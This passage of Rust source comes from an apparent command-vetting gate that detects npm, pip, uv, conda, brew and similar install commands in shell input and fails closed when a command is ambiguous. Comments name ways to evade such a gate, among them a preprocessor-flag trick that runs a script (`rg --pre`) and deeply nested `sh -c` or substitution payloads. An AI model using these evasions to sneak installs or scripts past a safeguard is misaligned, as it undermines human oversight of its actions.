///     each file (Codex BLOCKER): `rg --pre /tmp/script.sh pattern .`
///
/// If you ever want to surface real installs invoked through these
/// utilities, walk the script body via `extract_recursion_segments` — do
/// NOT add them back to the allowlist.
const DATA_CONSUMING_UTILITIES: &[&str] = &[
    // Emit-as-data
    "echo", "printf", "cat", "tac", "tee",
    // Search-as-data (grep family — no `--pre`-style executable flag)
    "grep", "egrep", "fgrep", // Slice / trim-as-data
    "head", "tail", "nl", // Encode / decode (cannot execute)
    "base64", "xxd", "od", "hexdump",
    // Structured-text parse (jq has no shell-out; `--exec`-style flags do not exist)
    "jq",
];

/// True iff the first non-whitespace token of `segment`, basename-normalised,
/// matches a known data-consuming utility (see [`DATA_CONSUMING_UTILITIES`]).
///
/// Basename normalisation handles `/bin/echo`, `./echo`, `/usr/bin/grep` etc.
/// — the same path-bypass concern that #139 closed for installer heads
/// applies symmetrically here.
///
/// Returns `false` on an empty / whitespace-only segment, on segments that
/// begin with a shell operator, and on any unknown head.
#[allow(dead_code)] // exercised by tests + reserved for principled-path follow-up
fn command_head_is_data_utility(segment: &str) -> bool {
    let Ok(tokens) = shell_tokens(segment) else {
        return false;
    };
    let head = match tokens.first() {
        Some((_, t)) => t.as_str(),
        None => return false,
    };
    // A leading shell operator (e.g. trailing chain fragment with no head)
    // is not a data utility — it's just empty.
    if is_shell_operator(head) {
        return false;
    }
    let basename = installer_basename(head);
    DATA_CONSUMING_UTILITIES.contains(&basename)
}

/// Mask command segments whose head verb is a data-consuming utility (see
/// [`command_head_is_data_utility`]). Returns a string of the same byte
/// length as `cmd` — bytes inside masked segments are replaced with ASCII
/// spaces, chain operators and unmasked segments are preserved verbatim.
///
/// Preserving byte offsets matters: the regex prefix-anchor in NPM_RE /
/// PIP_RE / etc. relies on the boundary char immediately before the install
/// verb (space, `&&`, `||`, `;`, `/`, `\`), and the downstream `claimed`
/// dedup uses absolute indices into the command. Replacing with spaces
/// (not deleting) keeps both invariants intact.
///
/// Segment boundaries are shell operator tokens (`;`, `|`, `||`, `&`, `&&`,
/// `>`, `>>`, `<`, `<<`) as produced by [`shell_tokens`]. Each segment's
/// head is the first non-operator token; the segment span is `[head_off,
/// next_op_off)` — using the next operator's source offset as the segment
/// end avoids the trap that `shell_tokens` strips quote characters from
/// token payloads (so `tok.len()` no longer equals the source-span length
/// for a quoted token).
fn mask_data_utility_segments(cmd: &str) -> String {
    let Ok(tokens) = shell_tokens(cmd) else {
        // Do not suppress any surface when shell structure is ambiguous.
        // The token-first detector will emit the fail-closed finding.
        return cmd.to_string();
    };
    let bytes = cmd.as_bytes();
    let mut out: Vec<u8> = bytes.to_vec();

    let mask_range = |buf: &mut Vec<u8>, start: usize, end: usize| {
        for b in buf.iter_mut().take(end).skip(start) {
            // Preserve newlines so any multi-line invariants survive; we
            // are not currently aware of one, but it costs nothing.
            if *b != b'\n' {
                *b = b' ';
            }
        }
    };

    let mut seg_head_off: Option<usize> = None;
    let mut seg_head_is_data_util = false;

    for (off, tok) in &tokens {
        if is_shell_operator(tok) {
            // Close the in-flight segment at the operator's source offset.
            if let (Some(start), true) = (seg_head_off, seg_head_is_data_util) {
                mask_range(&mut out, start, *off);
            }
            seg_head_off = None;
            seg_head_is_data_util = false;
            continue;
        }
        // First word of a fresh segment establishes the head.
        if seg_head_off.is_none() {
            seg_head_off = Some(*off);
            let basename = installer_basename(tok);
            seg_head_is_data_util = DATA_CONSUMING_UTILITIES.contains(&basename);
        }
    }
    // Flush the final segment — it runs to end-of-string.
    if let (Some(start), true) = (seg_head_off, seg_head_is_data_util) {
        mask_range(&mut out, start, bytes.len());
    }

    // Safety: we only overwrite ASCII word bytes with ASCII spaces — ASCII
    // space is never a UTF-8 continuation byte, so multi-byte sequences
    // inside masked spans get replaced byte-by-byte with valid UTF-8. The
    // result is therefore valid UTF-8 and `from_utf8` cannot fail in
    // practice; fall back to the original `cmd` on the impossible case
    // rather than panic, honouring the gate's no-panic contract.
    String::from_utf8(out).unwrap_or_else(|_| cmd.to_string())
}

/// Detect package-manager install invocations in a shell command.
///
/// ## Scope (codified after Codex + agy peer review on #143)
///
/// The gate is intentionally limited to the install-shaped surfaces below.
/// Anything outside this list returns [`Verdict::Skip`] — that is not a
/// silent miss, it is a documented scope boundary. Expansion candidates
/// (bun, pdm, pipenv, conda, mamba, brew, plus `pnpm update`,
/// `poetry update`, etc.) are tracked in
/// [issue #144](https://github.com/thehoff/contextcrawler/issues/144).
///
/// **In scope** (package-bearing, via regex):
/// - `npm install <pkg>` / `npm i <pkg>` / `npm add <pkg>`
/// - `pnpm install <pkg>` / `pnpm i <pkg>` / `pnpm add <pkg>`
/// - `yarn add <pkg>`
/// - `pip install <pkg>` / `pip3 install <pkg>` / `pip3.12.exe install <pkg>` etc.
/// - `uv install <pkg>` / `uv add <pkg>` / `uv pip install <pkg>`
/// - `poetry add <pkg>`
/// - `pipx install <pkg>`
/// - local-classification / fail-closed additions from lab #144:
///   `bun install|add|i <pkg>`, `pdm add <pkg>`, `pipenv install <pkg>`,
///   `conda install|create ...`, `mamba install|create ...`,
///   `pnpm update <pkg>`, `poetry update <pkg>`, `brew install <pkg>`
///
/// **In scope** (bare lockfile / always-bare, via token walk):
/// - `npm install` / `npm i` / `npm ci`
/// - `pnpm install` / `pnpm i` / `pnpm ci`
/// - `yarn install`, bare `yarn`, and `yarn <install-flag>` (e.g.
///   `yarn --frozen-lockfile`) — Yarn's shorthand for `yarn install`
/// - `poetry install` (always bare, all args are flags)
/// - `uv sync` / `uv pip sync` (always bare, all args are flags)
///
/// **Deliberately out of scope** (maintenance / lockfile-only / non-install):
/// - `npm rebuild`, `npm dedupe`, `npm update`
/// - `uv lock`, `poetry lock`
/// - `yarn --version`, `yarn -v`, `yarn --help`, `yarn -h` — diagnostic
///   forms; filtered by `is_yarn_help_or_version_flag` in the bare-yarn arm
///
/// All path forms (POSIX abs, POSIX rel, Windows `\` paths, `.cmd`/`.exe`/
/// `.bat` launcher suffixes, chained extensions, all case variants) are
/// normalised by [`installer_basename`] and the regex anchor before the
/// match arms see the token.
fn detect_installs(cmd: &str) -> Vec<ParsedInstall> {
    // Collapse shell line-continuation (`\` + newline + indent) into a single
    // space BEFORE detection (#143 / agy HIGH). Without this, the `\r\n`
    // guard in the regex capture truncates at the trailing `\` and packages
    // on the next line escape detection. The normalised form re-anchors the
    // entire install on one logical line so the regex absorbs every token.
    let normalised_cow = LINE_CONT_RE.replace_all(cmd, " ");
    let cmd: &str = normalised_cow.as_ref();

    let mut out = Vec::new();
    detect_installs_into(cmd, 0, &mut out);
    // Cross-layer dedup. The outer regex pass + recursion into `sh -c`
    // bodies / substitutions will both fire on the same install when the
    // wrapper passes the verb through verbatim (e.g. `sh -c 'npm install
    // foo'` matches NPM_RE via the `'` anchor AND the recursed body
    // matches it again). Two ParsedInstalls with identical content
    // collapse to one — we lose no information, but the gate stops
    // double-vetting the same package set.
    dedup_installs(&mut out);
    out
}

/// Stable canonical signature of a `ParsedInstall` for hash-based dedup.
/// Packages are sorted so two installs listing `[a, b]` and `[b, a]`
/// hash equal — they semantically install the same set (#146 agy LOW).
#[derive(Hash, PartialEq, Eq)]
struct InstallSignature {
    ecosystem: Ecosystem,
    has_editable: bool,
    unvettable: Option<String>,
    sorted_packages: Vec<(String, Option<String>)>,
}

fn install_signature(item: &ParsedInstall) -> InstallSignature {
    let mut pkgs = item.packages.clone();
    pkgs.sort();
    InstallSignature {
        ecosystem: item.ecosystem,
        has_editable: item.has_editable,
        unvettable: item.unvettable.clone(),
        sorted_packages: pkgs,
    }
}

/// Structural dedup: collapse `ParsedInstall`s that carry the same
/// ecosystem + package set + editable + unvettable detail. Order of the
/// first occurrence is preserved (stable). O(n) — was O(n²) pairwise
/// before #149.
fn dedup_installs(items: &mut Vec<ParsedInstall>) {
    let mut seen: std::collections::HashSet<InstallSignature> =
        std::collections::HashSet::with_capacity(items.len());
    items.retain(|item| seen.insert(install_signature(item)));
}

/// Recursion-bounded core of [`detect_installs`]. `depth` guards against a
/// pathological `$(${...})` nesting (or future bug) that would otherwise
/// recurse without bound. Each `sh -c` / `$(…)` / backtick body recurses
/// once at `depth + 1`, and `MAX_RECURSION_DEPTH` caps the total at a
/// number well above any realistic shell-script shape.
const MAX_RECURSION_DEPTH: u8 = 6;

fn detect_installs_into(cmd: &str, depth: u8, out: &mut Vec<ParsedInstall>) {
    // #141: mask any segment whose head verb is a data-consuming utility
    // (echo, printf, cat, grep, jq, base64, …). The masked string has the
    // SAME byte offsets — bytes inside masked segments are turned into
    // spaces — so all downstream regex anchors, the `claimed` index
    // bookkeeping, AND `mask_quoted_operators` (which also produces a
    // same-length string) compose cleanly.
    //
    // Applied at every recursion depth — wrappers like `sh -c 'echo "npm
    // install foo"'` extract the inner `echo "..."` payload via
    // `extract_recursion_segments` and recurse here; the inner head is also
    // a data utility and must be masked at the inner depth, not just at the
    // top level.
    //
    // Crucially, the recursion sweep below runs against the ORIGINAL
    // `cmd_raw` (NOT the masked copy). Substitution bodies inside a masked
    // data-utility segment still surface for recursion — masking only
    // suppresses the surface-level regex pass for that segment, not the
    // recursion sweep. This is intentional: `echo "$(npm install foo)"`
    // does execute the substitution at runtime, so the gate must still vet
    // its body.
    let cmd_raw = cmd;
    let masked_data = mask_data_utility_segments(cmd_raw);
    let cmd: &str = masked_data.as_str();

    // Run UV before PIP so `uv pip install foo` is claimed by the UV pattern
    // and PIP_RE matching the inner `pip install foo` substring is suppressed
    // for that span.
    // Map of start-byte → end-byte for claimed spans, sorted by start.
    // O(log n) overlap-check via `range(..=start).next_back()` — was a
    // linear scan (`claimed.iter().any(...)`) before #149.
    let mut claimed: std::collections::BTreeMap<usize, usize> = std::collections::BTreeMap::new();

    // Each entry: (regex, manager, ecosystem, local_only_caveat). `Some(msg)` means
    // detection is local-only and must fail closed to Ask without registry/OSV
    // calls. This preserves lab #144's expanded install detection while
    // honouring the updated direction not to add cloud API dependencies where
    // local Mongo/package intelligence would be needed. `None` keeps the
    // existing first-class npm/PyPI behaviour.
    let ordered: [(&Regex, &str, Ecosystem, Option<&'static str>); 15] = [
        (&*UV_RE, "uv", Ecosystem::Pypi, None),
        (&*NPM_RE, "npm", Ecosystem::Npm, None),
        (&*PNPM_RE, "pnpm", Ecosystem::Npm, None),
        (
            &*PNPM_UPDATE_RE,
            "pnpm",
            Ecosystem::Npm,
            Some(
                "pnpm update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        (&*YARN_RE, "yarn", Ecosystem::Npm, None),
        (
            &*BUN_RE,
            "bun",
            Ecosystem::Npm,
            Some(
                "bun install package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        (&*PIP_RE, "pip", Ecosystem::Pypi, None),
        (&*POETRY_RE, "poetry", Ecosystem::Pypi, None),
        (
            &*POETRY_UPDATE_RE,
            "poetry",
            Ecosystem::Pypi,
            Some(
                "poetry update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        (&*PIPX_RE, "pipx", Ecosystem::Pypi, None),
        (
            &*PDM_RE,
            "pdm",
            Ecosystem::Pypi,
            Some(
                "pdm package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        (
            &*PIPENV_RE,
            "pipenv",
            Ecosystem::Pypi,
            Some(
                "pipenv package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        (
            &*CONDA_RE,
            "conda",
            Ecosystem::Pypi,
            Some(
                "conda resolves from conda channels; not vettable against PyPI — review manually",
            ),
        ),
        (
            &*MAMBA_RE,
            "mamba",
            Ecosystem::Pypi,
            Some(
                "mamba resolves from conda channels; not vettable against PyPI — review manually",
            ),
        ),
        (
            &*BREW_RE,
            "brew",
            Ecosystem::Unknown,
            Some(
                "brew packages require Homebrew/local package intelligence; not vettable by this gate yet",
            ),
        ),
    ];

    // Run the regex pass against a same-length copy of `cmd` where shell
    // operators inside quotes are masked to spaces. This closes the
    // false-negative class where `[^|;&<>]+` truncates at a literal `&`
    // inside `--description="install & test"` and drops the package after
    // the flag. Byte offsets in `masked` map 1:1 to `cmd`, so we slice
    // arg-text from `cmd` itself (preserving the original characters).
    let masked = mask_quoted_operators(cmd);

    for (re, manager, eco, local_only_caveat) in ordered {
        for m in re.find_iter(&masked) {
            let (start, end) = (m.start(), m.end());
            // Skip if any earlier (higher-priority) pattern already claimed this span.
            if claimed.iter().any(|(s, e)| start >= *s && start < *e) {
                continue;
            }
            claimed.insert(start, end);
            let cap = match re.captures_at(&masked, start) {
                Some(c) => c,
                None => continue,
            };
            // Re-slice the argument span out of the ORIGINAL command so the
            // package names carry their real (unmasked) characters. The
            // masking only ever rewrites bytes inside quoted regions to
            // spaces, so the offsets are identical in both strings.
            let arg_string = cap.get(1).map(|m| &cmd[m.start()..m.end()]).unwrap_or("");
            let (pkgs, has_editable, lockfile_source) = parse_package_args(arg_string, manager);
            // Local-only added surfaces: package names may parse, but without
            // the repo's requested Mongo/local-model package-intelligence path
            // we must not query remote registries/OSV. Drop parsed packages so
            // `check()` surfaces Ask and performs no cloud API calls.
            if let Some(caveat) = local_only_caveat {
                out.push(ParsedInstall {
                    ecosystem: eco,
                    packages: Vec::new(),
                    has_editable: false,
                    unvettable: Some(caveat.to_string()),
                });
                continue;
            }
            // An install verb was detected. If no package is nameable AND no
            // editable token is present, the install set is unvettable
            // (lockfile / requirements / constraints indirection, or an
            // install verb whose only args were flags). Surface it instead
            // of dropping the whole install silently — see #111 G1.
            let unvettable = if pkgs.is_empty() && !has_editable {
                Some(lockfile_source.unwrap_or_else(|| {
                    "install resolves packages from a lockfile/requirements file the gate cannot vet"
                        .to_string()
                }))
            } else {
                lockfile_source
            };
            out.push(ParsedInstall {
                ecosystem: eco,
                packages: pkgs,
                has_editable,
                unvettable,
            });
        }
    }

    // Raw regex is deliberately retained for the established fast path, but
    // shell words are authoritative for quote concatenation and option
    // placement. This fallback only claims spans the regex pass did not.
    detect_tokenised_installs(cmd, &mut claimed, out);

    // Bare lockfile installs (`npm install` / `npm ci` / `pnpm install` /
    // `yarn install` / `yarn` with no package args) never match the
    // package-bearing regexes above. They are classified from the parsed
    // token stream rather than a regex that must see end-of-command: a
    // regex anchored on `$`/delimiter is defeated by trailing flags such
    // as `npm ci --ignore-scripts` or `yarn install --immutable`, which
    // would then fall through as a silent Skip (#111 G1 follow-up).
    detect_bare_lockfile_installs(cmd, &mut claimed, out);

    // Recurse into shell-wrapped install shells: `sh -c '<install>'`,
    // `$(<install>)`, backticks. Each inner command is treated as its own
    // top-level command — claimed-span dedup is local to a single string,
    // so duplicates between layers are not a concern.
    //
    // Depth limit (Codex + agy BLOCKER on #146): at `MAX_RECURSION_DEPTH`
    // the recursion stops. The original implementation silently dropped
    // any installs at depths beyond the cap — fail-OPEN. A nested payload
    // (`sh -c "$(sh -c "$(sh -c '...')")"`) that exceeds the cap would
    // then auto-allow at the gate. The fix: at the cap, if there are still
    // unresolved recursion segments, surface a synthetic Unvettable
    // ParsedInstall so the caller fails CLOSED (Verdict::Ask) instead.
    let recursion_segments = extract_recursion_segments(cmd_raw);
    let process_segments = match crate::discover::lexer::extract_process_substitutions(cmd_raw) {
        Ok(segments) => segments,
        Err(()) => {
            out.push(ParsedInstall {
                ecosystem: Ecosystem::Unknown,
                packages: Vec::new(),
                has_editable: false,
                unvettable: Some(
                    "malformed or over-limit process substitution cannot be vetted".to_string(),
                ),
            });
            Vec::new()
        }
    };
    let has_process_segments = !process_segments.is_empty();

    if depth < MAX_RECURSION_DEPTH {
        // Recurse against the original (unmasked) cmd: a substitution body
        // nested inside a data-utility segment still executes at runtime
        // (`echo "$(npm install foo)"`) and must be vetted.
        for inner in recursion_segments.into_iter().chain(
            process_segments
                .into_iter()
                .map(|substitution| substitution.inner),
        ) {
            detect_installs_into(&inner, depth + 1, out);
        }
    } else if !recursion_segments.is_empty() || has_process_segments {
        out.push(ParsedInstall {
            ecosystem: Ecosystem::Unknown, // #147 — was hardcoded Npm; relabel
            packages: Vec::new(),
            has_editable: false,
            unvettable: Some(format!(
                "recursion depth limit ({}) reached — nested shell payload exceeds vetting capacity, treat as unvettable",
                MAX_RECURSION_DEPTH
            )),
        });
    }
}

/// Last path component of a token, stripping POSIX (`/`) and Windows (`\`)
/// separators, then dropping trailing Windows launcher extensions
/// (`.cmd` / `.exe` / `.bat`) case-insensitively in a loop so chained
/// extensions like `npm.cmd.exe` collapse to `npm`. Used to normalise an
/// installer command head before matching `"npm"` / `"pnpm"` / `"yarn"` —
/// both `/Users/.../bin/npm` and `C:\Tools\npm.cmd` (and `NPM.CMD`,
/// `npm.cmd.exe`) classify as `npm`. Returns the original-cased subslice
/// so callers can still see the source casing if needed — match arms
/// should compare with `eq_ignore_ascii_case` or lowercase first.
/// Is this token one of the canonical Yarn diagnostic flags that should NOT
/// be classified as a bare-install verb? `yarn --version`, `yarn -v`,
/// `yarn --help`, `yarn -h` are query-style invocations — they read state
/// and exit without touching the dependency tree. Codex peer-review LOW on
/// #143 flagged the bare-yarn rule's over-match for these.
fn is_yarn_help_or_version_flag(tok: &str) -> bool {
    matches!(tok, "--version" | "-v" | "--help" | "-h")
}

fn installer_basename(tok: &str) -> &str {
    let mut base = tok.rsplit(['/', '\\']).next().unwrap_or(tok);
    // Loop: strip the longest matching suffix until none match.
    loop {
        let mut stripped = false;
        for suffix in [".cmd", ".exe", ".bat"] {
            // ASCII case folding preserves byte offsets. `strip_suffix` on
            // the folded copy establishes a valid UTF-8 boundary before the
            // original is sliced (unlike `len() - 4` on an arbitrary token).
            let folded = base.to_ascii_lowercase();
            if let Some(prefix) = folded.strip_suffix(suffix) {
                base = &base[..prefix.len()];
                stripped = true;
                break;
            }
        }
        if !stripped {
            break;
        }
    }
    base
}

#[derive(Clone, Copy)]
struct TokenInstallSpec {
    verb_end_idx: usize,
    ecosystem: Ecosystem,
    accepts_packages: bool,
    local_only_caveat: Option<&'static str>,
}

fn normalised_manager(token: &str) -> Option<String> {
    let manager = installer_basename(token).to_ascii_lowercase();
    let pip_suffix = manager.strip_prefix("pip");
    if pip_suffix.is_some_and(|suffix| {
        suffix.is_empty()
            || suffix
                .split('.')
                .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
    }) {
        return Some("pip".to_string());
    }
    matches!(
        manager.as_str(),
        "npm"
            | "pnpm"
            | "yarn"
            | "bun"
            | "uv"
            | "poetry"
            | "pipx"
            | "pdm"
            | "pipenv"
            | "conda"
            | "mamba"
            | "brew"
    )
    .then_some(manager)
}

fn manager_option_takes_value(manager: &str, flag: &str) -> bool {
    match manager {
        "npm" => matches!(
            flag,
            "--prefix"
                | "-C"
                | "--cache"
                | "--userconfig"
                | "--globalconfig"
                | "--registry"
                | "--scope"
                | "--workspace"
                | "-w"
                | "--loglevel"
        ),
        "pnpm" => matches!(
            flag,
            "--dir"
                | "-C"
                | "--registry"
                | "--global-dir"
                | "--store-dir"
                | "--config-dir"
                | "--virtual-store-dir"
                | "--filter"
                | "-F"
                | "--workspace-dir"
        ),
        "yarn" => matches!(
            flag,
            "--cwd"
                | "--registry"
                | "--use-yarnrc"
                | "--mutex"
                | "--cache-folder"
                | "--preferred-cache-folder"
                | "--modules-folder"
                | "--link-folder"
                | "--global-folder"
        ),
        "bun" => matches!(flag, "--cwd" | "--config" | "--backend" | "--registry"),
        "pip" => matches!(
            flag,
            "--python"
                | "--log"
                | "--keyring-provider"
                | "--proxy"
                | "--retries"
                | "--timeout"
                | "--exists-action"
                | "--trusted-host"
                | "--cert"
                | "--client-cert"
                | "--cache-dir"
                | "--use-feature"
                | "--use-deprecated"
                | "--index-url"
                | "-i"
                | "--extra-index-url"
                | "--find-links"
                | "-f"
        ),
        "uv" => matches!(
            flag,
            "--directory"
                | "--project"
                | "--config-file"
                | "--cache-dir"
                | "--python"
                | "--color"
                | "--index"
                | "--default-index"
                | "--index-url"
                | "--extra-index-url"
                | "--find-links"
                | "-f"
        ),
        "poetry" => matches!(flag, "--directory" | "-C" | "--project" | "-P"),
        "pipx" => matches!(flag, "--global" | "--pip-args" | "--python"),
        "pdm" => matches!(flag, "--project" | "-p" | "--config"),
        "pipenv" => matches!(flag, "--where" | "--venv" | "--py" | "--envs"),
        "conda" | "mamba" => matches!(
            flag,
            "--name" | "-n" | "--prefix" | "-p" | "--channel" | "-c"
        ),
        "brew" => matches!(flag, "--repository"),
        _ => false,
    }
}

fn manager_option_is_boolean(manager: &str, flag: &str) -> bool {
    if flag == "--" {
        return true;
    }
    match manager {
        "npm" => matches!(
            flag,
            "--global"
                | "-g"
                | "--force"
                | "--silent"
                | "--json"
                | "--yes"
                | "-y"
                | "--save"
                | "--save-dev"
                | "-D"
                | "--save-prod"
                | "-P"
                | "--save-optional"
                | "-O"
                | "--save-peer"
                | "--no-save"
                | "--production"
                | "--ignore-scripts"
                | "--no-audit"
                | "--no-fund"
        ),
        "pnpm" => matches!(
            flag,
            "--global"
                | "-g"
                | "--workspace-root"
                | "-w"
                | "--silent"
                | "--frozen-lockfile"
                | "--lockfile-only"
                | "--ignore-scripts"
                | "--offline"
                | "--prefer-offline"
        ),
        "yarn" => matches!(
            flag,
            "--silent"
                | "--verbose"
                | "--json"
                | "--offline"
                | "--frozen-lockfile"
                | "--production"
                | "--ignore-scripts"
                | "--non-interactive"
        ),
        "bun" => matches!(
            flag,
            "--silent"
                | "--verbose"
                | "--no-save"
                | "--frozen-lockfile"
                | "--production"
                | "--dry-run"
        ),
        "pip" => {
            matches!(
                flag,
                "--isolated"
                    | "--require-virtualenv"
                    | "--no-input"
                    | "--no-cache-dir"
                    | "--disable-pip-version-check"
                    | "--no-color"
                    | "--no-python-version-warning"
                    | "--user"
                    | "-U"
                    | "--upgrade"
                    | "--pre"
                    | "--no-deps"
                    | "--no-index"
                    | "--verbose"
                    | "--quiet"
            ) || is_repeated_short_flag(flag, 'v')
                || is_repeated_short_flag(flag, 'q')
        }
        "uv" => {
            matches!(
                flag,
                "--offline"
                    | "--no-cache"
                    | "--native-tls"
                    | "--managed-python"
                    | "--verbose"
                    | "--quiet"
                    | "-U"
                    | "--upgrade"
                    | "--pre"
                    | "--no-deps"
                    | "--no-index"
            ) || is_repeated_short_flag(flag, 'v')
                || is_repeated_short_flag(flag, 'q')
        }
        "poetry" => matches!(
            flag,
            "--no-cache" | "--no-plugins" | "--no-interaction" | "-n"
        ),
        "pipx" => matches!(flag, "--verbose" | "--quiet"),
        "pdm" => matches!(flag, "--global" | "-g" | "--verbose" | "-v"),
        "pipenv" => matches!(flag, "--bare" | "--quiet" | "--verbose"),
        "conda" | "mamba" => matches!(flag, "--yes" | "-y" | "--quiet" | "-q" | "--json"),
        "brew" => matches!(flag, "--debug" | "--quiet" | "--verbose"),
        _ => false,
    }
}

fn is_repeated_short_flag(flag: &str, expected: char) -> bool {
    flag.strip_prefix('-').is_some_and(|suffix| {
        !suffix.is_empty() && suffix.chars().all(|character| character == expected)
    })
}

fn trim_shell_token(token: &str) -> &str {
    token.trim().trim_matches(['\'', '"'])
}

fn is_default_registry(manager: &str, value: Option<&str>) -> bool {
    let Some(value) = value.map(trim_shell_token) else {
        return false;
    };
    let value = value.trim_end_matches('/');
    match manager {
        "npm" | "pnpm" | "yarn" | "bun" => value.eq_ignore_ascii_case("https://registry.npmjs.org"),
        "pip" | "uv" => value.eq_ignore_ascii_case("https://pypi.org/simple"),
        _ => false,
    }
}

/// Return a credential-free explanation when a CLI option can change the
/// source whose package is actually installed. Explicitly selecting the same
/// public registry queried by this gate is safe; config/directory switches and
/// alternate or additional sources are unvettable without evaluating external
/// configuration.
fn source_option_unvettable_detail(
    manager: &str,
    flag: &str,
    value: Option<&str>,
) -> Option<String> {
    let registry_flag = matches!(manager, "npm" | "pnpm" | "yarn" | "bun") && flag == "--registry";
    let primary_index_flag =
        matches!(manager, "pip" | "uv") && matches!(flag, "--index-url" | "-i" | "--default-index");
    if registry_flag || primary_index_flag {
        return (!is_default_registry(manager, value)).then(|| {
            format!(
                "{manager} {flag} selects a registry the gate does not query; refusing to vet against unrelated metadata"
            )
        });
    }

    let changes_source_or_config = match manager {
        "npm" => matches!(flag, "--userconfig" | "--globalconfig" | "--prefix" | "-C"),
        "pnpm" => matches!(flag, "--dir" | "-C" | "--config-dir" | "--workspace-dir"),
        "yarn" => matches!(flag, "--cwd" | "--use-yarnrc"),
        "bun" => matches!(flag, "--cwd" | "--config"),
        "pip" => matches!(
            flag,
            "--extra-index-url" | "--find-links" | "-f" | "--no-index"
        ),
        "uv" => matches!(
            flag,
            "--index"
                | "--extra-index-url"
                | "--find-links"
                | "-f"
                | "--no-index"
                | "--config-file"
                | "--directory"
                | "--project"
        ),
        "poetry" => matches!(flag, "--directory" | "-C" | "--project" | "-P"),
        _ => false,
    };
    changes_source_or_config.then(|| {
        format!(
            "{manager} {flag} can change registry/config resolution; the selected metadata source cannot be verified"
        )
    })
}

fn token_install_spec(
    manager: &str,
    tokens: &[(usize, String)],
    idx: usize,
    segment_end: usize,
) -> Option<TokenInstallSpec> {
    let word = tokens.get(idx)?.1.to_ascii_lowercase();
    let spec = match (manager, word.as_str()) {
        ("npm", "install" | "i" | "add") | ("pnpm", "install" | "i" | "add") => {
            (Ecosystem::Npm, true, None)
        }
        ("npm", "ci") | ("pnpm", "ci") => (Ecosystem::Npm, false, None),
        ("pnpm", "update") => (
            Ecosystem::Npm,
            true,
            Some(
                "pnpm update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        ("yarn", "add") => (Ecosystem::Npm, true, None),
        ("yarn", "install") => (Ecosystem::Npm, false, None),
        ("bun", "install" | "i" | "add") => (
            Ecosystem::Npm,
            true,
            Some(
                "bun install package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        ("pip", "install") => (Ecosystem::Pypi, true, None),
        ("uv", "install" | "add") => (Ecosystem::Pypi, true, None),
        ("uv", "sync") => (Ecosystem::Pypi, false, None),
        ("uv", "pip")
            if idx + 1 < segment_end
                && tokens[idx + 1].1.eq_ignore_ascii_case("install") =>
        {
            return Some(TokenInstallSpec {
                verb_end_idx: idx + 1,
                ecosystem: Ecosystem::Pypi,
                accepts_packages: true,
                local_only_caveat: None,
            });
        }
        ("uv", "pip")
            if idx + 1 < segment_end && tokens[idx + 1].1.eq_ignore_ascii_case("sync") =>
        {
            return Some(TokenInstallSpec {
                verb_end_idx: idx + 1,
                ecosystem: Ecosystem::Pypi,
                accepts_packages: false,
                local_only_caveat: None,
            });
        }
        ("poetry", "add") => (Ecosystem::Pypi, true, None),
        ("poetry", "install") => (Ecosystem::Pypi, false, None),
        ("poetry", "update") => (
            Ecosystem::Pypi,
            true,
            Some(
                "poetry update package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        ("pipx", "install") => (Ecosystem::Pypi, true, None),
        ("pdm", "add") => (
            Ecosystem::Pypi,
            true,
            Some(
                "pdm package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        ("pdm", "install" | "sync") => (Ecosystem::Pypi, false, None),
        ("pipenv", "install") => (
            Ecosystem::Pypi,
            true,
            Some(
                "pipenv package intelligence requires local Mongo/local-model support; not vettable by this gate yet",
            ),
        ),
        ("pipenv", "sync") => (Ecosystem::Pypi, false, None),
        ("conda", "install" | "create") => (
            Ecosystem::Pypi,
            true,
            Some("conda resolves from conda channels; not vettable against PyPI — review manually"),
        ),
        ("mamba", "install" | "create") => (
            Ecosystem::Pypi,
            true,
            Some("mamba resolves from conda channels; not vettable against PyPI — review manually"),
        ),
        ("brew", "install") => (
            Ecosystem::Unknown,
            true,
            Some(
                "brew packages require Homebrew/local package intelligence; not vettable by this gate yet",
            ),
        ),
        _ => return None,
    };

    Some(TokenInstallSpec {
        verb_end_idx: idx,
        ecosystem: spec.0,
        accepts_packages: spec.1,
        local_only_caveat: spec.2,
    })
}

fn locate_token_install(
    manager: &str,
    tokens: &[(usize, String)],
    head_idx: usize,
    segment_end: usize,
) -> Option<(TokenInstallSpec, bool, Option<String>)> {
    let mut idx = head_idx + 1;
    let mut ambiguous_option = false;
    let mut source_option_detail = None;
    while idx < segment_end {
        if let Some(spec) = token_install_spec(manager, tokens, idx, segment_end) {
            return Some((spec, ambiguous_option, source_option_detail));
        }

        let token = tokens[idx].1.as_str();
        if !token.starts_with('-') {
            if ambiguous_option {
                for probe in idx + 1..segment_end {
                    if let Some(spec) = token_install_spec(manager, tokens, probe, segment_end) {
                        return Some((spec, true, source_option_detail));
                    }
                }
            }
            return None;
        }

        let (flag, attached_value) = token
            .split_once('=')
            .map_or((token, None), |(flag, value)| (flag, Some(value)));
        let option_value = attached_value.or_else(|| {
            tokens
                .get(idx + 1)
                .filter(|(_, value)| !value.starts_with('-'))
                .map(|(_, value)| value.as_str())
        });
        if let Some(detail) = source_option_unvettable_detail(manager, flag, option_value) {
            source_option_detail.get_or_insert(detail);
        }
        let attached = attached_value.is_some();
        if attached || manager_option_is_boolean(manager, flag) {
            idx += 1;
        } else if manager_option_takes_value(manager, flag) {
            idx = idx.saturating_add(2);
        } else {
            // Unknown option arity is ambiguous. Continue looking for a
            // recognised install verb, but mark the result unvettable rather
            // than guessing that this option cannot consume the next word.
            ambiguous_option = true;
            idx += 1;
        }
    }
    None
}

/// Token-first fallback for installs raw regex cannot safely classify:
/// concatenated quoted fragments and manager-wide options before the verb.
fn detect_tokenised_installs(
    cmd: &str,
    claimed: &mut std::collections::BTreeMap<usize, usize>,
    out: &mut Vec<ParsedInstall>,
) {
    let tokens = match shell_tokens(cmd) {
        Ok(tokens) => tokens,
        Err(error) => {
            out.push(ParsedInstall {
                ecosystem: Ecosystem::Unknown,
                packages: Vec::new(),
                has_editable: false,
